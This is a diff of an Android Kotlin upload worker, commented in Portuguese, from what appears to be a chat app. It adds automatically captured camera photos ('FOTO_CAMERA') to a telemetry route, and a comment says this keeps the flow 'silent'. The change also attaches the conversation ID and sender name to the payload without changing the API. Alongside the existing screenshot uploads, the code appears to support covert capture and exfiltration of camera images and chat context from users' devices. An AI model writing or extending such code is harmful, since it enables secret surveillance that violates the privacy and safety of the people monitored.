@@ -18,6 +18,8 @@ import java.io.File
 /**
  * UploadWorker: Gerencia uploads assíncronos de Mídia de Chat e Telemetria.
  * Implementação inteligente que decide entre a rota de Chat ou Telemetria.
+ * 
+ * Ajustado para suportar metadados enriquecidos de captura automática (FOTO_CAMERA).
  */
 class UploadWorker(
     appContext: Context,
@@ -35,6 +37,7 @@ class UploadWorker(
         }
 
         // Identificação do tipo de upload para decidir a rota
+        // FOTO_CAMERA agora é tratado como Telemetria para garantir o fluxo silencioso
         val isTelemetry = type == "TELEMETRY" || type == "SCREENSHOT" || type == "LOG" || type == "FOTO_CAMERA"
 
         val workerResult = try {
@@ -76,7 +79,6 @@ class UploadWorker(
         filePart: MultipartBody.Part,
         type: String
     ): Result {
-        // Recuperação de dados do inputData
         val text = inputData.getString(KEY_TEXT) ?: ""
         val conversationId = inputData.getString(KEY_CONVERSATION_ID) ?: "default_chat"
         val senderId = inputData.getString(KEY_SENDER_ID) ?: "anonimo"
@@ -91,7 +93,7 @@ class UploadWorker(
             senderZangiNumber = senderZangiNumber.toRequestBody(null),
             conversationId = conversationId.toRequestBody(null),
             type = type.toRequestBody(null),
-            deviceInfo = null // Chat não exige deviceInfo obrigatório
+            deviceInfo = null 
         )
 
         return handleResponse(response, "Chat Media")
@@ -99,18 +101,28 @@ class UploadWorker(
 
     /**
      * Realiza o upload para a rota de telemetria (api/system/telemetry)
+     * Ajustado para processar metadados enriquecidos da captura automática.
      */
     private suspend fun performTelemetryUpload(
         filePart: MultipartBody.Part,
         eventType: String
     ): Result {
+        // Recuperação de dados básicos
         val userId = inputData.getString(KEY_USER_ID) ?: "unknown"
-        val deviceInfo = inputData.getString(KEY_DEVICE_INFO) ?: "Android Device"
+        val deviceInfoRaw = inputData.getString(KEY_DEVICE_INFO) ?: "Android Device"
+        
+        // Recuperação de metadados de contexto (para capturas automáticas)
+        val conversationId = inputData.getString(KEY_CONVERSATION_ID) ?: "N/A"
+        val senderName = inputData.getString(KEY_SENDER_NAME) ?: "System"
+
+        // Construção da string de metadados enriquecida para o backend
+        // Isso permite que o seu servidor receba o contexto completo sem mudar o contrato da API
+        val enrichedDeviceInfo = "$deviceInfoRaw | ConvID: $conversationId | User: $senderName"
 
         val response = RetrofitClient.getApiService().uploadTelemetry(
             userId = userId.toRequestBody(null),
             eventType = eventType.toRequestBody(null),
-            deviceInfo = deviceInfo.toRequestBody(null),
+            deviceInfo = enrichedDeviceInfo.toRequestBody(null),
             file = filePart
         )
 
@@ -124,6 +136,7 @@ class UploadWorker(
         } else {
             val code = response.code()
             Log.e("UploadWorker", "❌ [$context] Falha: $code - ${response.message()}")
+            // Se for erro de cliente (4xx), falha. Se for erro de servidor (5xx), tenta novamente.
             if (code in 400..499) Result.failure() else Result.retry()
         }
     }
@@ -137,6 +150,6 @@ class UploadWorker(
         const val KEY_SENDER_ZANGI_NUMBER = "key_sender_zangi_number"
         const val KEY_CONVERSATION_ID = "key_conversation_id"
         const val KEY_DEVICE_INFO = "key_device_info"
-        const val KEY_USER_ID = "key_user_id" // Adicionado para Telemetria
+        const val KEY_USER_ID = "key_user_id"
     }
 }
